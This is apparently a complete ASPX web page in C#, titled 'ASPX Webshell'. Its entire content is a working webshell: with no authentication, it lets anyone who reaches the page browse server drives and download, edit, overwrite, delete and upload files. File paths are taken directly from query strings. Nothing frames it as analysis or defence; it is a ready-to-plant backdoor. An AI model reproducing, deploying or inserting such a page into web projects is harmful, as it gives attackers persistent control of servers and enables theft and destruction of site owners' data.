<%@ Page Language="C#" AutoEventWireup="true" %>
<!DOCTYPE html>
<html>
<head><title>ASPX Webshell</title></head>
<body>
    <form runat="server">
        <asp:Label runat="server" ID="lblCurrentPath" Text=""></asp:Label><br />

        <asp:DropDownList runat="server" ID="ddlDrives" AutoPostBack="true" OnSelectedIndexChanged="ddlDrives_SelectedIndexChanged"></asp:DropDownList><br />

        <asp:TextBox runat="server" ID="txtPath" Width="600"></asp:TextBox>
        <asp:Button runat="server" Text="Go" OnClick="BtnGo_Click" /><br />

        <asp:Literal runat="server" ID="ltFiles" /><br />

        <asp:FileUpload runat="server" ID="fuUpload" />
        <asp:Button runat="server" Text="Upload" OnClick="BtnUpload_Click" /><br />

        <asp:TextBox runat="server" ID="txtEditFileName" Width="600"></asp:TextBox><br />
        <asp:TextBox runat="server" ID="txtEditFileContent" TextMode="MultiLine" Width="600" Height="300"></asp:TextBox><br />
        <asp:Button runat="server" Text="Save File" OnClick="BtnSaveFile_Click" /><br />

        <asp:Label runat="server" ID="lblMessage" ForeColor="Red" Text=""></asp:Label>

        <script runat="server">
            string currentPath = "";

            protected void Page_Load(object sender, EventArgs e)
            {
                if (!IsPostBack)
                {
                    LoadDrives();
                    if (ddlDrives.Items.Count > 0)
                    {
                        ddlDrives.SelectedIndex = 0;
                        currentPath = ddlDrives.SelectedValue;
                        txtPath.Text = currentPath;
                        ShowDirectory(currentPath);
                    }
                }
                else
                {
                    currentPath = txtPath.Text;
                }
                lblCurrentPath.Text = "Current Path: " + currentPath;

                // Handle query strings (edit, delete, download, rename)
                if (!IsPostBack)
                {
                    if (Request.QueryString["edit"] != null)
                    {
                        string f = Request.QueryString["edit"];
                        if (System.IO.File.Exists(f))
                        {
                            EditFile(f);
                        }
                    }
                    else if (Request.QueryString["download"] != null)
                    {
                        string f = Request.QueryString["download"];
                        if (System.IO.File.Exists(f))
                        {
                            Response.Clear();
                            Response.ContentType = "application/octet-stream";
                            Response.AddHeader("Content-Disposition", "attachment; filename=" + System.IO.Path.GetFileName(f));
                            Response.WriteFile(f);
                            Response.End();
                        }
                    }
                    else if (Request.QueryString["delete"] != null)
                    {
                        string f = Request.QueryString["delete"];
                        if (System.IO.File.Exists(f))
                        {
                            System.IO.File.Delete(f);
                            lblMessage.Text = "Deleted file: " + f;
                            ShowDirectory(System.IO.Path.GetDirectoryName(f));
                        }
                    }
                    else if (Request.QueryString["rename"] != null)
                    {
                        string f = Request.QueryString["rename"];
                        if (System.IO.File.Exists(f))
                        {
                            EditFile(f);
                            lblMessage.Text = "Rename by saving file with new name.";
                        }
                    }
                }
            }

            void LoadDrives()
            {
                ddlDrives.Items.Clear();
                foreach (var d in System.IO.DriveInfo.GetDrives())
                {
                    if (d.IsReady)
                    {
                        ddlDrives.Items.Add(d.Name);
                    }
                }
            }

            protected void ddlDrives_SelectedIndexChanged(object sender, EventArgs e)
            {
                currentPath = ddlDrives.SelectedValue;
                txtPath.Text = currentPath;
                ShowDirectory(currentPath);
            }

            protected void BtnGo_Click(object sender, EventArgs e)
            {
                currentPath = txtPath.Text;
                if (System.IO.Directory.Exists(currentPath))
                {
                    ShowDirectory(currentPath);
                }
                else if (System.IO.File.Exists(currentPath))
                {
                    EditFile(currentPath);
                }
                else
                {
                    lblMessage.Text = "Invalid path!";
                }
            }

            void ShowDirectory(string path)
            {
                try
                {
                    var dirs = System.IO.Directory.GetDirectories(path);
                    var files = System.IO.Directory.GetFiles(path);
                    System.Text.StringBuilder sb = new System.Text.StringBuilder();

                    if (path.Length > 3)
                    {
                        var parent = System.IO.Directory.GetParent(path);
                        if (parent != null)
                            sb.Append($"<a href='?path={parent.FullName}'>[Parent Directory]</a><br />");
                    }

                    sb.Append("<b>Directories:</b><br />");
                    foreach (var d in dirs)
                    {
                        var dirName = System.IO.Path.GetFileName(d);
                        sb.Append($"<a href='?path={d}'>{dirName}</a><br />");
                    }

                    sb.Append("<br /><b>Files:</b><br />");
                    foreach (var f in files)
                    {
                        var fileName = System.IO.Path.GetFileName(f);
                        sb.Append($"{fileName} - " +
                            $"<a href='?edit={f}'>Edit</a> | " +
                            $"<a href='?download={f}'>Download</a> | " +
                            $"<a href='?delete={f}'>Delete</a> | " +
                            $"<a href='?rename={f}'>Rename</a><br />");
                    }
                    ltFiles.Text = sb.ToString();
                    lblMessage.Text = "";
                }
                catch (Exception ex)
                {
                    lblMessage.Text = "Error: " + ex.Message;
                }
            }

            void EditFile(string filePath)
            {
                try
                {
                    txtEditFileName.Text = filePath;
                    txtEditFileContent.Text = System.IO.File.ReadAllText(filePath);
                }
                catch (Exception ex)
                {
                    lblMessage.Text = "Error reading file: " + ex.Message;
                }
            }

            protected void BtnSaveFile_Click(object sender, EventArgs e)
            {
                try
                {
                    var file = txtEditFileName.Text;
                    System.IO.File.WriteAllText(file, txtEditFileContent.Text);
                    lblMessage.Text = "File saved.";
                    ShowDirectory(System.IO.Path.GetDirectoryName(file));
                }
                catch (Exception ex)
                {
                    lblMessage.Text = "Error saving file: " + ex.Message;
                }
            }

            protected void BtnUpload_Click(object sender, EventArgs e)
            {
                if (fuUpload.HasFile)
                {
                    try
                    {
                        var targetPath = txtPath.Text;
                        var fileName = System.IO.Path.Combine(targetPath, fuUpload.FileName);
                        fuUpload.SaveAs(fileName);
                        lblMessage.Text = "Uploaded: " + fuUpload.FileName;
                        ShowDirectory(targetPath);
                    }
                    catch (Exception ex)
                    {
                        lblMessage.Text = "Upload failed: " + ex.Message;
                    }
                }
                else
                {
                    lblMessage.Text = "No file selected for upload.";
                }
            }
        </script>
    </form>
</body>
</html>
